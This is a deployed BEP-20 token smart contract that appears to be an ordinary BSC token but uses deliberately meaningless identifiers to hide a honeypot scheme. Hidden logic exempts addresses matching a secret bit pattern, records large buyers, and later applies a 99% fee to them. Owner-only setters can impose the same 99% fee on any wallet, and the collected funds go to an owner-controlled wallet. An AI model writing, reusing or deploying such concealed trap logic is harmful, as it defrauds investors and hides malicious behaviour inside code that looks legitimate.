/**
 *Submitted for verification at BscScan.com on 2022-12-14
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Manager {
    address internal owner;
    mapping(address => bool) internal competent;

    constructor(address _owner) {
        owner = _owner;
        competent[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        competent[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        competent[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return competent[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        competent[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract AssheadEstrusCyan is IBEP20, Manager {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Asshead Estrus Cyan ";
    string constant _symbol = "AssheadEstrusCyan";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private modeBurnExemptTxTeam;
    mapping(address => bool) private minSellMarketingMax;
    mapping(address => bool) private sellSwapLiquidityTrading;
    mapping(address => bool) private tradingAutoFeeWalletBuy;
    mapping(address => uint256) private walletModeLiquidityTradingSwapBots;
    mapping(uint256 => address) private autoModeTeamBuy;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private botsSellTradingMinReceiverIsLiquidity = 0;
    uint256 private burnSellTxLiquidity = 6;

    //SELL FEES
    uint256 private liquidityReceiverLimitMarketing = 0;
    uint256 private launchedBurnSellMarketing = 6;

    uint256 private sellTxLiquidityMarketing = burnSellTxLiquidity + botsSellTradingMinReceiverIsLiquidity;
    uint256 private receiverSellLaunchedSwapTradingExempt = 100;

    address private buyReceiverLimitFeeTeamMaxMode = (msg.sender); // auto-liq address
    address private buyWalletMinMarketing = (0x0D5c0bD6AdF5e99eefB66e13ffFfF5D85aDA3228); // marketing address
    address private limitLiquidityIsBurn = DEAD;
    address private walletIsLiquidityTeam = DEAD;
    address private tradingSellLimitBuy = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private marketingBotsTxTeam;
    uint256 private buyReceiverLaunchedModeIsMaxTx;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private modeFeeMarketingAuto;
    uint256 private sellWalletFeeMinBotsTxExempt;
    uint256 private buySellLiquidityExempt;
    uint256 private maxTeamMinTxExempt;
    uint256 private burnFeeExemptMaxLaunchedBuy;

    bool private exemptTeamReceiverMax = true;
    bool private tradingAutoFeeWalletBuyMode = true;
    bool private sellWalletLimitMax = true;
    bool private launchedTxSwapExempt = true;
    bool private receiverTxLimitBots = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private exemptLiquidityFeeAutoSellBurn = 6 * 10 ** 15;
    uint256 private walletBurnLimitTrading = _totalSupply / 1000; // 0.1%

    
    uint256 private marketingSellMaxExemptTx = 0;
    uint256 private swapBuyIsTxSellLaunched = 0;
    bool private feeMarketingTeamLiquidity = false;
    uint256 private receiverMaxMarketingIs = 0;
    bool private burnLaunchedSwapTeamWalletTradingMarketing = false;
    bool private marketingReceiverWalletFeeTradingAutoExempt = false;
    bool private burnTxSellFee = false;
    bool private exemptMarketingTxAuto = false;
    bool private limitFeeSwapLaunched = false;
    uint256 private receiverMaxExemptMin = 0;
    bool private swapBuyIsTxSellLaunched0 = false;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Manager(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        modeFeeMarketingAuto = true;

        modeBurnExemptTxTeam[msg.sender] = true;
        modeBurnExemptTxTeam[address(this)] = true;

        minSellMarketingMax[msg.sender] = true;
        minSellMarketingMax[0x0000000000000000000000000000000000000000] = true;
        minSellMarketingMax[0x000000000000000000000000000000000000dEaD] = true;
        minSellMarketingMax[address(this)] = true;

        sellSwapLiquidityTrading[msg.sender] = true;
        sellSwapLiquidityTrading[0x0000000000000000000000000000000000000000] = true;
        sellSwapLiquidityTrading[0x000000000000000000000000000000000000dEaD] = true;
        sellSwapLiquidityTrading[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return sellLaunchedLiquidityModeWalletBurnTrading(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Asshead Estrus Cyan  Insufficient Allowance");
        }

        return sellLaunchedLiquidityModeWalletBurnTrading(sender, recipient, amount);
    }

    function sellLaunchedLiquidityModeWalletBurnTrading(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        if (burnTxSellFee != receiverTxLimitBots) {
            burnTxSellFee = launchedTxSwapExempt;
        }

        if (receiverMaxMarketingIs != walletBurnLimitTrading) {
            receiverMaxMarketingIs = sellTxLiquidityMarketing;
        }


        bool bLimitTxWalletValue = exemptWalletTradingFee(sender) || exemptWalletTradingFee(recipient);
        
        if (limitFeeSwapLaunched == tradingAutoFeeWalletBuyMode) {
            limitFeeSwapLaunched = tradingAutoFeeWalletBuyMode;
        }

        if (feeMarketingTeamLiquidity != sellWalletLimitMax) {
            feeMarketingTeamLiquidity = sellWalletLimitMax;
        }


        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && isOwner(recipient)) {
                liquidityTxBuyAuto();
            }
            if (!bLimitTxWalletValue) {
                feeBotsWalletReceiver(recipient);
            }
        }
        
        if (inSwap || bLimitTxWalletValue) {return burnTradingReceiverBotsIsFee(sender, recipient, amount);}

        if (!modeBurnExemptTxTeam[sender] && !modeBurnExemptTxTeam[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Asshead Estrus Cyan  Max wallet has been triggered");
        }
        
        if (marketingReceiverWalletFeeTradingAutoExempt != swapBuyIsTxSellLaunched0) {
            marketingReceiverWalletFeeTradingAutoExempt = exemptMarketingTxAuto;
        }

        if (feeMarketingTeamLiquidity != exemptMarketingTxAuto) {
            feeMarketingTeamLiquidity = launchedTxSwapExempt;
        }

        if (exemptMarketingTxAuto != burnLaunchedSwapTeamWalletTradingMarketing) {
            exemptMarketingTxAuto = launchedTxSwapExempt;
        }


        require((amount <= _maxTxAmount) || sellSwapLiquidityTrading[sender] || sellSwapLiquidityTrading[recipient], "Asshead Estrus Cyan  Max TX Limit has been triggered");

        if (walletModeMaxSwap()) {feeLaunchedTradingBurn();}

        _balances[sender] = _balances[sender].sub(amount, "Asshead Estrus Cyan  Insufficient Balance");
        
        if (receiverMaxMarketingIs == receiverMaxMarketingIs) {
            receiverMaxMarketingIs = launchedBurnSellMarketing;
        }


        uint256 amountReceived = minMaxExemptLiquidity(sender) ? teamAutoTxReceiverMarketingBotsExempt(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function burnTradingReceiverBotsIsFee(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Asshead Estrus Cyan  Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function minMaxExemptLiquidity(address sender) internal view returns (bool) {
        return !minSellMarketingMax[sender];
    }

    function feeTxIsModeMin(address sender, bool selling) internal returns (uint256) {
        
        if (swapBuyIsTxSellLaunched0 != tradingAutoFeeWalletBuyMode) {
            swapBuyIsTxSellLaunched0 = limitFeeSwapLaunched;
        }

        if (swapBuyIsTxSellLaunched != botsSellTradingMinReceiverIsLiquidity) {
            swapBuyIsTxSellLaunched = exemptLiquidityFeeAutoSellBurn;
        }

        if (limitFeeSwapLaunched == marketingReceiverWalletFeeTradingAutoExempt) {
            limitFeeSwapLaunched = limitFeeSwapLaunched;
        }


        if (selling) {
            sellTxLiquidityMarketing = launchedBurnSellMarketing + liquidityReceiverLimitMarketing;
            return exemptReceiverTeamFee(sender, sellTxLiquidityMarketing);
        }
        if (!selling && sender == uniswapV2Pair) {
            sellTxLiquidityMarketing = burnSellTxLiquidity + botsSellTradingMinReceiverIsLiquidity;
            return sellTxLiquidityMarketing;
        }
        return exemptReceiverTeamFee(sender, sellTxLiquidityMarketing);
    }

    function isMarketingLaunchedAuto() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function teamAutoTxReceiverMarketingBotsExempt(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = amount.mul(feeTxIsModeMin(sender, receiver == uniswapV2Pair)).div(receiverSellLaunchedSwapTradingExempt);

        if (tradingAutoFeeWalletBuy[sender] || tradingAutoFeeWalletBuy[receiver]) {
            feeAmount = amount.mul(99).div(receiverSellLaunchedSwapTradingExempt);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function exemptWalletTradingFee(address addr) private view returns (bool) {
        uint256 v0 = uint256(uint160(addr)) << 192;
        v0 = v0 >> 238;
        return v0 == firstSetAutoReceiver;
    }

    function exemptReceiverTeamFee(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lcfkd = walletModeLiquidityTradingSwapBots[sender];
        uint256 kdkls = pFee;
        if (lcfkd > 0 && block.timestamp - lcfkd > 2) {
            kdkls = 99;
        }
        return kdkls;
    }

    function feeBotsWalletReceiver(address addr) private {
        if (isMarketingLaunchedAuto() < exemptLiquidityFeeAutoSellBurn) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        autoModeTeamBuy[exemptLimitValue] = addr;
    }

    function liquidityTxBuyAuto() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (walletModeLiquidityTradingSwapBots[autoModeTeamBuy[i]] == 0) {
                    walletModeLiquidityTradingSwapBots[autoModeTeamBuy[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(buyWalletMinMarketing).transfer(amountBNB * amountPercentage / 100);
    }

    function walletModeMaxSwap() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    receiverTxLimitBots &&
    _balances[address(this)] >= walletBurnLimitTrading;
    }

    function feeLaunchedTradingBurn() internal swapping {
        
        if (burnLaunchedSwapTeamWalletTradingMarketing != exemptMarketingTxAuto) {
            burnLaunchedSwapTeamWalletTradingMarketing = tradingAutoFeeWalletBuyMode;
        }

        if (marketingReceiverWalletFeeTradingAutoExempt == swapBuyIsTxSellLaunched0) {
            marketingReceiverWalletFeeTradingAutoExempt = limitFeeSwapLaunched;
        }

        if (marketingSellMaxExemptTx == botsSellTradingMinReceiverIsLiquidity) {
            marketingSellMaxExemptTx = liquidityReceiverLimitMarketing;
        }


        uint256 amountToLiquify = walletBurnLimitTrading.mul(botsSellTradingMinReceiverIsLiquidity).div(sellTxLiquidityMarketing).div(2);
        uint256 amountToSwap = walletBurnLimitTrading.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = sellTxLiquidityMarketing.sub(botsSellTradingMinReceiverIsLiquidity.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(botsSellTradingMinReceiverIsLiquidity).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(burnSellTxLiquidity).div(totalETHFee);
        
        if (exemptMarketingTxAuto != receiverTxLimitBots) {
            exemptMarketingTxAuto = burnTxSellFee;
        }


        payable(buyWalletMinMarketing).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                buyReceiverLimitFeeTeamMaxMode,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getLimitLiquidityIsBurn() public view returns (address) {
        if (limitLiquidityIsBurn != buyWalletMinMarketing) {
            return buyWalletMinMarketing;
        }
        if (limitLiquidityIsBurn != walletIsLiquidityTeam) {
            return walletIsLiquidityTeam;
        }
        return limitLiquidityIsBurn;
    }
    function setLimitLiquidityIsBurn(address a0) public onlyOwner {
        if (limitLiquidityIsBurn != walletIsLiquidityTeam) {
            walletIsLiquidityTeam=a0;
        }
        if (limitLiquidityIsBurn != buyWalletMinMarketing) {
            buyWalletMinMarketing=a0;
        }
        limitLiquidityIsBurn=a0;
    }

    function getSellSwapLiquidityTrading(address a0) public view returns (bool) {
            return sellSwapLiquidityTrading[a0];
    }
    function setSellSwapLiquidityTrading(address a0,bool a1) public onlyOwner {
        sellSwapLiquidityTrading[a0]=a1;
    }

    function getLimitFeeSwapLaunched() public view returns (bool) {
        if (limitFeeSwapLaunched != launchedTxSwapExempt) {
            return launchedTxSwapExempt;
        }
        if (limitFeeSwapLaunched == sellWalletLimitMax) {
            return sellWalletLimitMax;
        }
        return limitFeeSwapLaunched;
    }
    function setLimitFeeSwapLaunched(bool a0) public onlyOwner {
        limitFeeSwapLaunched=a0;
    }

    function getWalletModeLiquidityTradingSwapBots(address a0) public view returns (uint256) {
            return walletModeLiquidityTradingSwapBots[a0];
    }
    function setWalletModeLiquidityTradingSwapBots(address a0,uint256 a1) public onlyOwner {
        walletModeLiquidityTradingSwapBots[a0]=a1;
    }

    function getBuyReceiverLimitFeeTeamMaxMode() public view returns (address) {
        if (buyReceiverLimitFeeTeamMaxMode == walletIsLiquidityTeam) {
            return walletIsLiquidityTeam;
        }
        if (buyReceiverLimitFeeTeamMaxMode == tradingSellLimitBuy) {
            return tradingSellLimitBuy;
        }
        if (buyReceiverLimitFeeTeamMaxMode != buyReceiverLimitFeeTeamMaxMode) {
            return buyReceiverLimitFeeTeamMaxMode;
        }
        return buyReceiverLimitFeeTeamMaxMode;
    }
    function setBuyReceiverLimitFeeTeamMaxMode(address a0) public onlyOwner {
        buyReceiverLimitFeeTeamMaxMode=a0;
    }

    function getExemptLiquidityFeeAutoSellBurn() public view returns (uint256) {
        if (exemptLiquidityFeeAutoSellBurn == receiverMaxMarketingIs) {
            return receiverMaxMarketingIs;
        }
        if (exemptLiquidityFeeAutoSellBurn == marketingSellMaxExemptTx) {
            return marketingSellMaxExemptTx;
        }
        if (exemptLiquidityFeeAutoSellBurn == launchedBurnSellMarketing) {
            return launchedBurnSellMarketing;
        }
        return exemptLiquidityFeeAutoSellBurn;
    }
    function setExemptLiquidityFeeAutoSellBurn(uint256 a0) public onlyOwner {
        exemptLiquidityFeeAutoSellBurn=a0;
    }

    function getLaunchedTxSwapExempt() public view returns (bool) {
        return launchedTxSwapExempt;
    }
    function setLaunchedTxSwapExempt(bool a0) public onlyOwner {
        if (launchedTxSwapExempt != sellWalletLimitMax) {
            sellWalletLimitMax=a0;
        }
        if (launchedTxSwapExempt != receiverTxLimitBots) {
            receiverTxLimitBots=a0;
        }
        if (launchedTxSwapExempt != sellWalletLimitMax) {
            sellWalletLimitMax=a0;
        }
        launchedTxSwapExempt=a0;
    }

    function getBurnTxSellFee() public view returns (bool) {
        if (burnTxSellFee != exemptMarketingTxAuto) {
            return exemptMarketingTxAuto;
        }
        if (burnTxSellFee != exemptMarketingTxAuto) {
            return exemptMarketingTxAuto;
        }
        if (burnTxSellFee != swapBuyIsTxSellLaunched0) {
            return swapBuyIsTxSellLaunched0;
        }
        return burnTxSellFee;
    }
    function setBurnTxSellFee(bool a0) public onlyOwner {
        if (burnTxSellFee == exemptMarketingTxAuto) {
            exemptMarketingTxAuto=a0;
        }
        burnTxSellFee=a0;
    }

    function getReceiverMaxMarketingIs() public view returns (uint256) {
        return receiverMaxMarketingIs;
    }
    function setReceiverMaxMarketingIs(uint256 a0) public onlyOwner {
        receiverMaxMarketingIs=a0;
    }

    function getExemptTeamReceiverMax() public view returns (bool) {
        return exemptTeamReceiverMax;
    }
    function setExemptTeamReceiverMax(bool a0) public onlyOwner {
        if (exemptTeamReceiverMax != exemptMarketingTxAuto) {
            exemptMarketingTxAuto=a0;
        }
        exemptTeamReceiverMax=a0;
    }

    function getLiquidityReceiverLimitMarketing() public view returns (uint256) {
        if (liquidityReceiverLimitMarketing == launchedBurnSellMarketing) {
            return launchedBurnSellMarketing;
        }
        return liquidityReceiverLimitMarketing;
    }
    function setLiquidityReceiverLimitMarketing(uint256 a0) public onlyOwner {
        if (liquidityReceiverLimitMarketing == exemptLiquidityFeeAutoSellBurn) {
            exemptLiquidityFeeAutoSellBurn=a0;
        }
        liquidityReceiverLimitMarketing=a0;
    }

    function getSellTxLiquidityMarketing() public view returns (uint256) {
        return sellTxLiquidityMarketing;
    }
    function setSellTxLiquidityMarketing(uint256 a0) public onlyOwner {
        sellTxLiquidityMarketing=a0;
    }

    function getLaunchedBurnSellMarketing() public view returns (uint256) {
        if (launchedBurnSellMarketing == launchedBurnSellMarketing) {
            return launchedBurnSellMarketing;
        }
        if (launchedBurnSellMarketing == walletBurnLimitTrading) {
            return walletBurnLimitTrading;
        }
        return launchedBurnSellMarketing;
    }
    function setLaunchedBurnSellMarketing(uint256 a0) public onlyOwner {
        if (launchedBurnSellMarketing == walletBurnLimitTrading) {
            walletBurnLimitTrading=a0;
        }
        launchedBurnSellMarketing=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}